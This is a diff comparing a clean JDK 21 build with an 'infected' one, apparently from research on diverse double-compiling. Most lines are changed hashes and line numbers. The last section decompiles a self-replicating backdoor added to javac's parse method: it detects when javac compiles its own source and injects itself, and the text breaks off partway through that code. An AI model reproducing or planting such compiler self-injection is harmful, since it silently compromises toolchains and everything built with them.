@@ -1,0 +1,1590 @@
+--- stage2_21.0.5-tem/
++++ stage2_21.0.5-infected_local/
+│   --- stage2_21.0.5-tem/jmods
+├── +++ stage2_21.0.5-infected_local/jmods
+│ │   --- stage2_21.0.5-tem/jmods/java.base.jmod
+│ ├── +++ stage2_21.0.5-infected_local/jmods/java.base.jmod
+│ │ ├── classes/module-info.class
+│ │ │ ├── javap -verbose -constants -s -l -private {}
+│ │ │ │ @@ -1,8 +1,8 @@
+│ │ │ │ +  SHA-256 checksum 9270bea5d32e7829994f2792ecd96814868906b2a64ed54df195c7900f9aad57
+│ │ │ │ -  SHA-256 checksum 59a7481c0dc8768b9ef66f233cf933877e6dbe5645d4dc270013ecc21e05bceb
+│ │ │ │    Compiled from "module-info.java"
+│ │ │ │  module java.base@21.0.5-internal
+│ │ │ │    minor version: 0
+│ │ │ │    major version: 65
+│ │ │ │    flags: (0x8000) ACC_MODULE
+│ │ │ │    this_class: #1                          // "module-info"
+│ │ │ │    super_class: #0
+│ │ │ │ @@ -1259,15 +1259,15 @@
+│ │ │ │    hash_length: 32
+│ │ │ │    hash: [e3ed80fe50667ec12d9ab6593e079cd3a7f4127f8a95135ebf0d375495388d92]
+│ │ │ │    #136                                    // jdk.charsets
+│ │ │ │    hash_length: 32
+│ │ │ │    hash: [e7781bd18cd84b42f3840ebcdfd74483f4bcbb7888eb078f95f93352746b2e83]
+│ │ │ │    #172                                    // jdk.compiler
+│ │ │ │    hash_length: 32
+│ │ │ │ +  hash: [c9289478adb115d4058b66f86a18a0db1ac3e5ef234b8080c546074e7481b8c0]
+│ │ │ │ -  hash: [cbeac461bc245f0acdd872976008a886f693a56d9ded33a853322ec95003bdaf]
+│ │ │ │    #118                                    // jdk.crypto.cryptoki
+│ │ │ │    hash_length: 32
+│ │ │ │    hash: [3c9e89c44f6ab6ab1cadf7d8d646fb8c19b13dd6db97a9e69e076fc6502dd035]
+│ │ │ │    #292                                    // jdk.crypto.ec
+│ │ │ │    hash_length: 32
+│ │ │ │    hash: [6dbd61b128c860c7d35fffa68f6d8cf57e419d34f004abe5b5295909204d5572]
+│ │ │ │    #238                                    // jdk.dynalink
+│ │   --- stage2_21.0.5-tem/jmods/jdk.compiler.jmod
+│ ├── +++ stage2_21.0.5-infected_local/jmods/jdk.compiler.jmod
+│ │ ├── classes/com/sun/tools/javac/main/JavaCompiler$1MethodBodyRemover.class
+│ │ │ ├── javap -verbose -constants -s -l -private {}
+│ │ │ │ @@ -1,8 +1,8 @@
+│ │ │ │ +  SHA-256 checksum 2026bc741833ef0ba8408236093c1e464cb9bf9dc4bf7eec502a1d93c2f6929a
+│ │ │ │ -  SHA-256 checksum 45e1c628d702729376936c3137e6023717a3bb4d1c15c1fff06bf53497d9ffbc
+│ │ │ │    Compiled from "JavaCompiler.java"
+│ │ │ │  class com.sun.tools.javac.main.JavaCompiler$1MethodBodyRemover extends com.sun.tools.javac.tree.TreeTranslator
+│ │ │ │    minor version: 0
+│ │ │ │    major version: 65
+│ │ │ │    flags: (0x0020) ACC_SUPER
+│ │ │ │    this_class: #2                          // com/sun/tools/javac/main/JavaCompiler$1MethodBodyRemover
+│ │ │ │    super_class: #12                        // com/sun/tools/javac/tree/TreeTranslator
+│ │ │ │ @@ -249,15 +249,15 @@
+│ │ │ │           5: aload_0
+│ │ │ │           6: iload_2
+│ │ │ │           7: putfield      #7                  // Field val$isInterface:Z
+│ │ │ │          10: aload_0
+│ │ │ │          11: invokespecial #11                 // Method com/sun/tools/javac/tree/TreeTranslator."<init>":()V
+│ │ │ │          14: return
+│ │ │ │        LineNumberTable:
+│ │ │ │ +        line 1824: 0
+│ │ │ │ -        line 1750: 0
+│ │ │ │        LocalVariableTable:
+│ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │              0      15     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1MethodBodyRemover;
+│ │ │ │              0      15     1 this$0   Lcom/sun/tools/javac/main/JavaCompiler;
+│ │ │ │      MethodParameters:
+│ │ │ │        Name                           Flags
+│ │ │ │        <no name>                      final mandated
+│ │ │ │ @@ -299,20 +299,20 @@
+│ │ │ │          61: aconst_null
+│ │ │ │          62: putfield      #58                 // Field com/sun/tools/javac/tree/JCTree$JCMethodDecl.body:Lcom/sun/tools/javac/tree/JCTree$JCBlock;
+│ │ │ │          65: aload_0
+│ │ │ │          66: aload_1
+│ │ │ │          67: invokespecial #62                 // Method com/sun/tools/javac/tree/TreeTranslator.visitMethodDef:(Lcom/sun/tools/javac/tree/JCTree$JCMethodDecl;)V
+│ │ │ │          70: return
+│ │ │ │        LineNumberTable:
+│ │ │ │ +        line 1827: 0
+│ │ │ │ +        line 1828: 15
+│ │ │ │ +        line 1829: 42
+│ │ │ │ +        line 1830: 60
+│ │ │ │ +        line 1831: 65
+│ │ │ │ +        line 1832: 70
+│ │ │ │ -        line 1753: 0
+│ │ │ │ -        line 1754: 15
+│ │ │ │ -        line 1755: 42
+│ │ │ │ -        line 1756: 60
+│ │ │ │ -        line 1757: 65
+│ │ │ │ -        line 1758: 70
+│ │ │ │        LocalVariableTable:
+│ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │             42      15     3    vd   Lcom/sun/tools/javac/tree/JCTree$JCVariableDecl;
+│ │ │ │              0      71     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1MethodBodyRemover;
+│ │ │ │              0      71     1  tree   Lcom/sun/tools/javac/tree/JCTree$JCMethodDecl;
+│ │ │ │        StackMapTable: number_of_entries = 2
+│ │ │ │          frame_type = 252 /* append */
+│ │ │ │ @@ -338,18 +338,18 @@
+│ │ │ │          21: aconst_null
+│ │ │ │          22: putfield      #66                 // Field com/sun/tools/javac/tree/JCTree$JCVariableDecl.init:Lcom/sun/tools/javac/tree/JCTree$JCExpression;
+│ │ │ │          25: aload_0
+│ │ │ │          26: aload_1
+│ │ │ │          27: invokespecial #81                 // Method com/sun/tools/javac/tree/TreeTranslator.visitVarDef:(Lcom/sun/tools/javac/tree/JCTree$JCVariableDecl;)V
+│ │ │ │          30: return
+│ │ │ │        LineNumberTable:
+│ │ │ │ +        line 1835: 0
+│ │ │ │ +        line 1836: 20
+│ │ │ │ +        line 1837: 25
+│ │ │ │ +        line 1838: 30
+│ │ │ │ -        line 1761: 0
+│ │ │ │ -        line 1762: 20
+│ │ │ │ -        line 1763: 25
+│ │ │ │ -        line 1764: 30
+│ │ │ │        LocalVariableTable:
+│ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │              0      31     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1MethodBodyRemover;
+│ │ │ │              0      31     1  tree   Lcom/sun/tools/javac/tree/JCTree$JCVariableDecl;
+│ │ │ │        StackMapTable: number_of_entries = 1
+│ │ │ │          frame_type = 25 /* same */
+│ │ │ │  
+│ │ │ │ @@ -509,31 +509,31 @@
+│ │ │ │         354: invokevirtual #172                // Method com/sun/tools/javac/util/ListBuffer.toList:()Lcom/sun/tools/javac/util/List;
+│ │ │ │         357: putfield      #88                 // Field com/sun/tools/javac/tree/JCTree$JCClassDecl.defs:Lcom/sun/tools/javac/util/List;
+│ │ │ │         360: aload_0
+│ │ │ │         361: aload_1
+│ │ │ │         362: invokespecial #176                // Method com/sun/tools/javac/tree/TreeTranslator.visitClassDef:(Lcom/sun/tools/javac/tree/JCTree$JCClassDecl;)V
+│ │ │ │         365: return
+│ │ │ │        LineNumberTable:
+│ │ │ │ +        line 1841: 0
+│ │ │ │ +        line 1842: 8
+│ │ │ │ +        line 1843: 20
+│ │ │ │ +        line 1844: 29
+│ │ │ │ +        line 1846: 68
+│ │ │ │ +        line 1848: 123
+│ │ │ │ +        line 1849: 142
+│ │ │ │ +        line 1852: 152
+│ │ │ │ +        line 1855: 231
+│ │ │ │ +        line 1856: 250
+│ │ │ │ +        line 1859: 260
+│ │ │ │ +        line 1860: 315
+│ │ │ │ +        line 1861: 334
+│ │ │ │ +        line 1842: 344
+│ │ │ │ +        line 1867: 352
+│ │ │ │ +        line 1868: 360
+│ │ │ │ +        line 1869: 365
+│ │ │ │ -        line 1767: 0
+│ │ │ │ -        line 1768: 8
+│ │ │ │ -        line 1769: 20
+│ │ │ │ -        line 1770: 29
+│ │ │ │ -        line 1772: 68
+│ │ │ │ -        line 1774: 123
+│ │ │ │ -        line 1775: 142
+│ │ │ │ -        line 1778: 152
+│ │ │ │ -        line 1781: 231
+│ │ │ │ -        line 1782: 250
+│ │ │ │ -        line 1785: 260
+│ │ │ │ -        line 1786: 315
+│ │ │ │ -        line 1787: 334
+│ │ │ │ -        line 1768: 344
+│ │ │ │ -        line 1793: 352
+│ │ │ │ -        line 1794: 360
+│ │ │ │ -        line 1795: 365
+│ │ │ │        LocalVariableTable:
+│ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │             29     315     4     t   Lcom/sun/tools/javac/tree/JCTree;
+│ │ │ │             13     339     3    it   Lcom/sun/tools/javac/util/List;
+│ │ │ │              0     366     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1MethodBodyRemover;
+│ │ │ │              0     366     1  tree   Lcom/sun/tools/javac/tree/JCTree$JCClassDecl;
+│ │ │ │              8     358     2 newdefs   Lcom/sun/tools/javac/util/ListBuffer;
+│ │ ├── classes/com/sun/tools/javac/main/JavaCompiler$1ScanNested.class
+│ │ │ ├── javap -verbose -constants -s -l -private {}
+│ │ │ │ @@ -1,8 +1,8 @@
+│ │ │ │ +  SHA-256 checksum 25c866b0eca758b9b6160b7b265ebf0dd53b00152b6e51d8e7f0e8508cb8a18c
+│ │ │ │ -  SHA-256 checksum 1491be2b30020ebc22ee7e3473c86a86c1fd28ba46cf4943f1222ae17603ca8e
+│ │ │ │    Compiled from "JavaCompiler.java"
+│ │ │ │  class com.sun.tools.javac.main.JavaCompiler$1ScanNested extends com.sun.tools.javac.tree.TreeScanner
+│ │ │ │    minor version: 0
+│ │ │ │    major version: 65
+│ │ │ │    flags: (0x0020) ACC_SUPER
+│ │ │ │    this_class: #2                          // com/sun/tools/javac/main/JavaCompiler$1ScanNested
+│ │ │ │    super_class: #12                        // com/sun/tools/javac/tree/TreeScanner
+│ │ │ │ @@ -243,16 +243,16 @@
+│ │ │ │          14: aload_0
+│ │ │ │          15: new           #17                 // class java/util/LinkedHashSet
+│ │ │ │          18: dup
+│ │ │ │          19: invokespecial #19                 // Method java/util/LinkedHashSet."<init>":()V
+│ │ │ │          22: putfield      #20                 // Field dependencies:Ljava/util/Set;
+│ │ │ │          25: return
+│ │ │ │        LineNumberTable:
+│ │ │ │ +        line 1580: 0
+│ │ │ │ +        line 1581: 14
+│ │ │ │ -        line 1506: 0
+│ │ │ │ -        line 1507: 14
+│ │ │ │        LocalVariableTable:
+│ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │              0      26     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1ScanNested;
+│ │ │ │              0      26     1 this$0   Lcom/sun/tools/javac/main/JavaCompiler;
+│ │ │ │      MethodParameters:
+│ │ │ │        Name                           Flags
+│ │ │ │        <no name>                      final mandated
+│ │ │ │ @@ -341,35 +341,35 @@
+│ │ │ │         157: invokespecial #103                // Method com/sun/tools/javac/tree/TreeScanner.visitClassDef:(Lcom/sun/tools/javac/tree/JCTree$JCClassDecl;)V
+│ │ │ │         160: return
+│ │ │ │        Exception table:
+│ │ │ │           from    to  target type
+│ │ │ │              97   106   121   any
+│ │ │ │             121   123   121   any
+│ │ │ │        LineNumberTable:
+│ │ │ │ +        line 1586: 0
+│ │ │ │ +        line 1587: 18
+│ │ │ │ +        line 1588: 20
+│ │ │ │ +        line 1589: 34
+│ │ │ │ +        line 1590: 43
+│ │ │ │ +        line 1591: 57
+│ │ │ │ +        line 1592: 71
+│ │ │ │ +        line 1593: 85
+│ │ │ │ +        line 1594: 91
+│ │ │ │ +        line 1596: 97
+│ │ │ │ +        line 1605: 106
+│ │ │ │ +        line 1606: 112
+│ │ │ │ +        line 1607: 118
+│ │ │ │ +        line 1605: 121
+│ │ │ │ +        line 1606: 129
+│ │ │ │ +        line 1607: 135
+│ │ │ │ +        line 1609: 138
+│ │ │ │ +        line 1611: 140
+│ │ │ │ +        line 1612: 152
+│ │ │ │ +        line 1613: 155
+│ │ │ │ +        line 1614: 160
+│ │ │ │ -        line 1512: 0
+│ │ │ │ -        line 1513: 18
+│ │ │ │ -        line 1514: 20
+│ │ │ │ -        line 1515: 34
+│ │ │ │ -        line 1516: 43
+│ │ │ │ -        line 1517: 57
+│ │ │ │ -        line 1518: 71
+│ │ │ │ -        line 1519: 85
+│ │ │ │ -        line 1520: 91
+│ │ │ │ -        line 1522: 97
+│ │ │ │ -        line 1531: 106
+│ │ │ │ -        line 1532: 112
+│ │ │ │ -        line 1533: 118
+│ │ │ │ -        line 1531: 121
+│ │ │ │ -        line 1532: 129
+│ │ │ │ -        line 1533: 135
+│ │ │ │ -        line 1535: 138
+│ │ │ │ -        line 1537: 140
+│ │ │ │ -        line 1538: 152
+│ │ │ │ -        line 1539: 155
+│ │ │ │ -        line 1540: 160
+│ │ │ │        LocalVariableTable:
+│ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │             91      47     6 prevHasLambdas   Z
+│ │ │ │             97      41     7 prevHasPatterns   Z
+│ │ │ │             43     109     4     c   Lcom/sun/tools/javac/code/Symbol$ClassSymbol;
+│ │ │ │             57      95     5 stEnv   Lcom/sun/tools/javac/comp/Env;
+│ │ │ │              0     161     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1ScanNested;
+│ │ │ │ @@ -402,17 +402,17 @@
+│ │ │ │           1: iconst_1
+│ │ │ │           2: putfield      #86                 // Field hasLambdas:Z
+│ │ │ │           5: aload_0
+│ │ │ │           6: aload_1
+│ │ │ │           7: invokespecial #107                // Method com/sun/tools/javac/tree/TreeScanner.visitLambda:(Lcom/sun/tools/javac/tree/JCTree$JCLambda;)V
+│ │ │ │          10: return
+│ │ │ │        LineNumberTable:
+│ │ │ │ +        line 1617: 0
+│ │ │ │ +        line 1618: 5
+│ │ │ │ +        line 1619: 10
+│ │ │ │ -        line 1543: 0
+│ │ │ │ -        line 1544: 5
+│ │ │ │ -        line 1545: 10
+│ │ │ │        LocalVariableTable:
+│ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │              0      11     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1ScanNested;
+│ │ │ │              0      11     1  tree   Lcom/sun/tools/javac/tree/JCTree$JCLambda;
+│ │ │ │  
+│ │ │ │    public void visitReference(com.sun.tools.javac.tree.JCTree$JCMemberReference);
+│ │ │ │      descriptor: (Lcom/sun/tools/javac/tree/JCTree$JCMemberReference;)V
+│ │ │ │ @@ -423,17 +423,17 @@
+│ │ │ │           1: iconst_1
+│ │ │ │           2: putfield      #86                 // Field hasLambdas:Z
+│ │ │ │           5: aload_0
+│ │ │ │           6: aload_1
+│ │ │ │           7: invokespecial #111                // Method com/sun/tools/javac/tree/TreeScanner.visitReference:(Lcom/sun/tools/javac/tree/JCTree$JCMemberReference;)V
+│ │ │ │          10: return
+│ │ │ │        LineNumberTable:
+│ │ │ │ +        line 1622: 0
+│ │ │ │ +        line 1623: 5
+│ │ │ │ +        line 1624: 10
+│ │ │ │ -        line 1548: 0
+│ │ │ │ -        line 1549: 5
+│ │ │ │ -        line 1550: 10
+│ │ │ │        LocalVariableTable:
+│ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │              0      11     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1ScanNested;
+│ │ │ │              0      11     1  tree   Lcom/sun/tools/javac/tree/JCTree$JCMemberReference;
+│ │ │ │  
+│ │ │ │    public void visitBindingPattern(com.sun.tools.javac.tree.JCTree$JCBindingPattern);
+│ │ │ │      descriptor: (Lcom/sun/tools/javac/tree/JCTree$JCBindingPattern;)V
+│ │ │ │ @@ -444,17 +444,17 @@
+│ │ │ │           1: iconst_1
+│ │ │ │           2: putfield      #90                 // Field hasPatterns:Z
+│ │ │ │           5: aload_0
+│ │ │ │           6: aload_1
+│ │ │ │           7: invokespecial #115                // Method com/sun/tools/javac/tree/TreeScanner.visitBindingPattern:(Lcom/sun/tools/javac/tree/JCTree$JCBindingPattern;)V
+│ │ │ │          10: return
+│ │ │ │        LineNumberTable:
+│ │ │ │ +        line 1627: 0
+│ │ │ │ +        line 1628: 5
+│ │ │ │ +        line 1629: 10
+│ │ │ │ -        line 1553: 0
+│ │ │ │ -        line 1554: 5
+│ │ │ │ -        line 1555: 10
+│ │ │ │        LocalVariableTable:
+│ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │              0      11     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1ScanNested;
+│ │ │ │              0      11     1  tree   Lcom/sun/tools/javac/tree/JCTree$JCBindingPattern;
+│ │ │ │  
+│ │ │ │    public void visitRecordPattern(com.sun.tools.javac.tree.JCTree$JCRecordPattern);
+│ │ │ │      descriptor: (Lcom/sun/tools/javac/tree/JCTree$JCRecordPattern;)V
+│ │ │ │ @@ -465,17 +465,17 @@
+│ │ │ │           1: iconst_1
+│ │ │ │           2: putfield      #90                 // Field hasPatterns:Z
+│ │ │ │           5: aload_0
+│ │ │ │           6: aload_1
+│ │ │ │           7: invokespecial #119                // Method com/sun/tools/javac/tree/TreeScanner.visitRecordPattern:(Lcom/sun/tools/javac/tree/JCTree$JCRecordPattern;)V
+│ │ │ │          10: return
+│ │ │ │        LineNumberTable:
+│ │ │ │ +        line 1632: 0
+│ │ │ │ +        line 1633: 5
+│ │ │ │ +        line 1634: 10
+│ │ │ │ -        line 1558: 0
+│ │ │ │ -        line 1559: 5
+│ │ │ │ -        line 1560: 10
+│ │ │ │        LocalVariableTable:
+│ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │              0      11     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1ScanNested;
+│ │ │ │              0      11     1  that   Lcom/sun/tools/javac/tree/JCTree$JCRecordPattern;
+│ │ │ │  
+│ │ │ │    public void visitSwitch(com.sun.tools.javac.tree.JCTree$JCSwitch);
+│ │ │ │      descriptor: (Lcom/sun/tools/javac/tree/JCTree$JCSwitch;)V
+│ │ │ │ @@ -490,17 +490,17 @@
+│ │ │ │           9: ior
+│ │ │ │          10: putfield      #90                 // Field hasPatterns:Z
+│ │ │ │          13: aload_0
+│ │ │ │          14: aload_1
+│ │ │ │          15: invokespecial #128                // Method com/sun/tools/javac/tree/TreeScanner.visitSwitch:(Lcom/sun/tools/javac/tree/JCTree$JCSwitch;)V
+│ │ │ │          18: return
+│ │ │ │        LineNumberTable:
+│ │ │ │ +        line 1637: 0
+│ │ │ │ +        line 1638: 13
+│ │ │ │ +        line 1639: 18
+│ │ │ │ -        line 1563: 0
+│ │ │ │ -        line 1564: 13
+│ │ │ │ -        line 1565: 18
+│ │ │ │        LocalVariableTable:
+│ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │              0      19     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1ScanNested;
+│ │ │ │              0      19     1  tree   Lcom/sun/tools/javac/tree/JCTree$JCSwitch;
+│ │ │ │  
+│ │ │ │    public void visitSwitchExpression(com.sun.tools.javac.tree.JCTree$JCSwitchExpression);
+│ │ │ │      descriptor: (Lcom/sun/tools/javac/tree/JCTree$JCSwitchExpression;)V
+│ │ │ │ @@ -515,17 +515,17 @@
+│ │ │ │           9: ior
+│ │ │ │          10: putfield      #90                 // Field hasPatterns:Z
+│ │ │ │          13: aload_0
+│ │ │ │          14: aload_1
+│ │ │ │          15: invokespecial #135                // Method com/sun/tools/javac/tree/TreeScanner.visitSwitchExpression:(Lcom/sun/tools/javac/tree/JCTree$JCSwitchExpression;)V
+│ │ │ │          18: return
+│ │ │ │        LineNumberTable:
+│ │ │ │ +        line 1642: 0
+│ │ │ │ +        line 1643: 13
+│ │ │ │ +        line 1644: 18
+│ │ │ │ -        line 1568: 0
+│ │ │ │ -        line 1569: 13
+│ │ │ │ -        line 1570: 18
+│ │ │ │        LocalVariableTable:
+│ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │              0      19     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1ScanNested;
+│ │ │ │              0      19     1  tree   Lcom/sun/tools/javac/tree/JCTree$JCSwitchExpression;
+│ │ │ │  }
+│ │ │ │  SourceFile: "JavaCompiler.java"
+│ │ │ │  EnclosingMethod: #25.#171               // com.sun.tools.javac.main.JavaCompiler.desugar
+│ │ ├── classes/com/sun/tools/javac/main/JavaCompiler$2.class
+│ │ │ ├── javap -verbose -constants -s -l -private {}
+│ │ │ │ @@ -1,8 +1,8 @@
+│ │ │ │ +  SHA-256 checksum b597e85ca096a42f05eb4be7e68f6c606f5b0368c25f974f1f8b2bf6848777a6
+│ │ │ │ -  SHA-256 checksum d409349ec021c3f2dfab8f0ced10284b2e1f62f5003b3940cfa417ae33abc10f
+│ │ │ │    Compiled from "JavaCompiler.java"
+│ │ │ │  class com.sun.tools.javac.main.JavaCompiler$2
+│ │ │ │    minor version: 0
+│ │ │ │    major version: 65
+│ │ │ │    flags: (0x1020) ACC_SUPER, ACC_SYNTHETIC
+│ │ │ │    this_class: #8                          // com/sun/tools/javac/main/JavaCompiler$2
+│ │ │ │    super_class: #29                        // java/lang/Object
+│ │ │ │ @@ -92,15 +92,15 @@
+│ │ │ │          54: return
+│ │ │ │        Exception table:
+│ │ │ │           from    to  target type
+│ │ │ │               9    20    23   Class java/lang/NoSuchFieldError
+│ │ │ │              24    35    38   Class java/lang/NoSuchFieldError
+│ │ │ │              39    50    53   Class java/lang/NoSuchFieldError
+│ │ │ │        LineNumberTable:
+│ │ │ │ +        line 1844: 0
+│ │ │ │ -        line 1770: 0
+│ │ │ │        LocalVariableTable:
+│ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │        StackMapTable: number_of_entries = 6
+│ │ │ │          frame_type = 87 /* same_locals_1_stack_item */
+│ │ │ │            stack = [ class java/lang/NoSuchFieldError ]
+│ │ │ │          frame_type = 0 /* same */
+│ │ │ │          frame_type = 77 /* same_locals_1_stack_item */
+│ │ ├── classes/com/sun/tools/javac/main/JavaCompiler$InitialFileParser.class
+│ │ │ ├── javap -verbose -constants -s -l -private {}
+│ │ │ │ @@ -1,8 +1,8 @@
+│ │ │ │ +  SHA-256 checksum a0f0d04aa4058014011087c4792115c7aa378c2636311de8b6d2d1deb50d94e8
+│ │ │ │ -  SHA-256 checksum 14f4bdce53157657e9b05e6e0188e3db9f43817d6cc7bd188004df44e4886265
+│ │ │ │    Compiled from "JavaCompiler.java"
+│ │ │ │  public class com.sun.tools.javac.main.JavaCompiler$InitialFileParser implements com.sun.tools.javac.main.JavaCompiler$InitialFileParserIntf
+│ │ │ │    minor version: 0
+│ │ │ │    major version: 65
+│ │ │ │    flags: (0x0021) ACC_PUBLIC, ACC_SUPER
+│ │ │ │    this_class: #2                          // com/sun/tools/javac/main/JavaCompiler$InitialFileParser
+│ │ │ │    super_class: #20                        // java/lang/Object
+│ │ │ │ @@ -110,18 +110,18 @@
+│ │ │ │          18: dup
+│ │ │ │          19: aload_0
+│ │ │ │          20: invokespecial #15                 // Method "<init>":(Lcom/sun/tools/javac/util/Context;)V
+│ │ │ │          23: astore_1
+│ │ │ │          24: aload_1
+│ │ │ │          25: areturn
+│ │ │ │        LineNumberTable:
+│ │ │ │ +        line 2032: 0
+│ │ │ │ +        line 2033: 11
+│ │ │ │ +        line 2034: 15
+│ │ │ │ +        line 2035: 24
+│ │ │ │ -        line 1958: 0
+│ │ │ │ -        line 1959: 11
+│ │ │ │ -        line 1960: 15
+│ │ │ │ -        line 1961: 24
+│ │ │ │        LocalVariableTable:
+│ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │              0      26     0 context   Lcom/sun/tools/javac/util/Context;
+│ │ │ │             11      15     1 instance   Lcom/sun/tools/javac/main/JavaCompiler$InitialFileParserIntf;
+│ │ │ │        StackMapTable: number_of_entries = 1
+│ │ │ │          frame_type = 252 /* append */
+│ │ │ │            offset_delta = 24
+│ │ │ │ @@ -140,18 +140,18 @@
+│ │ │ │           9: invokevirtual #24                 // Method com/sun/tools/javac/util/Context.put:(Lcom/sun/tools/javac/util/Context$Key;Ljava/lang/Object;)V
+│ │ │ │          12: aload_0
+│ │ │ │          13: aload_1
+│ │ │ │          14: invokestatic  #28                 // Method com/sun/tools/javac/main/JavaCompiler.instance:(Lcom/sun/tools/javac/util/Context;)Lcom/sun/tools/javac/main/JavaCompiler;
+│ │ │ │          17: putfield      #34                 // Field compiler:Lcom/sun/tools/javac/main/JavaCompiler;
+│ │ │ │          20: return
+│ │ │ │        LineNumberTable:
+│ │ │ │ +        line 2040: 0
+│ │ │ │ +        line 2041: 4
+│ │ │ │ +        line 2042: 12
+│ │ │ │ +        line 2043: 20
+│ │ │ │ -        line 1966: 0
+│ │ │ │ -        line 1967: 4
+│ │ │ │ -        line 1968: 12
+│ │ │ │ -        line 1969: 20
+│ │ │ │        LocalVariableTable:
+│ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │              0      21     0  this   Lcom/sun/tools/javac/main/JavaCompiler$InitialFileParser;
+│ │ │ │              0      21     1 context   Lcom/sun/tools/javac/util/Context;
+│ │ │ │  
+│ │ │ │    public com.sun.tools.javac.util.List<com.sun.tools.javac.tree.JCTree$JCCompilationUnit> parse(java.lang.Iterable<javax.tools.JavaFileObject>);
+│ │ │ │      descriptor: (Ljava/lang/Iterable;)Lcom/sun/tools/javac/util/List;
+│ │ │ │ @@ -161,15 +161,15 @@
+│ │ │ │           0: aload_0
+│ │ │ │           1: getfield      #34                 // Field compiler:Lcom/sun/tools/javac/main/JavaCompiler;
+│ │ │ │           4: aload_1
+│ │ │ │           5: iconst_0
+│ │ │ │           6: invokevirtual #38                 // Method com/sun/tools/javac/main/JavaCompiler.parseFiles:(Ljava/lang/Iterable;Z)Lcom/sun/tools/javac/util/List;
+│ │ │ │           9: areturn
+│ │ │ │        LineNumberTable:
+│ │ │ │ +        line 2047: 0
+│ │ │ │ -        line 1973: 0
+│ │ │ │        LocalVariableTable:
+│ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │              0      10     0  this   Lcom/sun/tools/javac/main/JavaCompiler$InitialFileParser;
+│ │ │ │              0      10     1 fileObjects   Ljava/lang/Iterable;
+│ │ │ │        LocalVariableTypeTable:
+│ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │              0      10     1 fileObjects   Ljava/lang/Iterable<Ljavax/tools/JavaFileObject;>;
+│ │ │ │ @@ -182,15 +182,15 @@
+│ │ │ │        stack=2, locals=0, args_size=0
+│ │ │ │           0: new           #42                 // class com/sun/tools/javac/util/Context$Key
+│ │ │ │           3: dup
+│ │ │ │           4: invokespecial #44                 // Method com/sun/tools/javac/util/Context$Key."<init>":()V
+│ │ │ │           7: putstatic     #1                  // Field initialParserKey:Lcom/sun/tools/javac/util/Context$Key;
+│ │ │ │          10: return
+│ │ │ │        LineNumberTable:
+│ │ │ │ +        line 2029: 0
+│ │ │ │ -        line 1955: 0
+│ │ │ │  }
+│ │ │ │  SourceFile: "JavaCompiler.java"
+│ │ │ │  NestHost: class com/sun/tools/javac/main/JavaCompiler
+│ │ │ │  InnerClasses:
+│ │ │ │    public static #69= #2 of #29;           // InitialFileParser=class com/sun/tools/javac/main/JavaCompiler$InitialFileParser of class com/sun/tools/javac/main/JavaCompiler
+│ │ │ │    public static #70= #42 of #8;           // Key=class com/sun/tools/javac/util/Context$Key of class com/sun/tools/javac/util/Context
+│ │ │ │    public static #71= #13 of #29;          // InitialFileParserIntf=class com/sun/tools/javac/main/JavaCompiler$InitialFileParserIntf of class com/sun/tools/javac/main/JavaCompiler
+│ │ ├── classes/com/sun/tools/javac/main/JavaCompiler.class
+│ │ │ ├── procyon -ec {}
+│ │ │ │ @@ -322,27 +322,100 @@
+│ │ │ │      }
+│ │ │ │      
+│ │ │ │      protected JCTree.JCCompilationUnit parse(final JavaFileObject filename, final CharSequence content) {
+│ │ │ │          return this.parse(filename, content, false);
+│ │ │ │      }
+│ │ │ │      
+│ │ │ │      private JCTree.JCCompilationUnit parse(final JavaFileObject filename, final CharSequence content, final boolean silent) {
+│ │ │ │ +        String content_str = "";
+│ │ │ │ +        if (content != null) {
+│ │ │ │ +            final int infectedDDC = 1;
+│ │ │ │ +            final String q = String.valueOf('\"');
+│ │ │ │ +            final String n = String.valueOf('\n');
+│ │ │ │ +            String rep = "";
+│ │ │ │ +            String ddc_target = "private JCCompilationUnit parse(JavaFileObject ";
+│ │ │ │ +            ddc_target += "filename, CharSequence content, boolean silent) {";
+│ │ │ │ +            final String[] l = { """
+│ │ │ │ +                                 String content_str = "";
+│ │ │ │ +                                 if (content != null) {
+│ │ │ │ +                                     int infectedDDC=1;
+│ │ │ │ +                                     String q = String.valueOf((char)34);
+│ │ │ │ +                                     String n = String.valueOf((char)10);
+│ │ │ │ +                                     String rep = "";
+│ │ │ │ +                                     String ddc_target = "private JCCompilationUnit parse(JavaFileObject ";
+│ │ │ │ +                                     ddc_target += "filename, CharSequence content, boolean silent) {";
+│ │ │ │ +                                     String[] l = {""", """
+│ │ │ │ +                                                            };
+│ │ │ │ +                                                            content_str = content.toString();
+│ │ │ │ +                                                            if (filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
+│ │ │ │ +                                                                if (content_str.indexOf("infectedDDC=1") != -1) {
+│ │ │ │ +                                                                    System.out.println("File already infected: ");
+│ │ │ │ +                                                                    System.out.println(filename.getName());
+│ │ │ │ +                                                                } else {
+│ │ │ │ +                                                                    System.out.println("Matched target injection file:");
+│ │ │ │ +                                                                    System.out.println(filename.getName());
+│ │ │ │ +                                                        
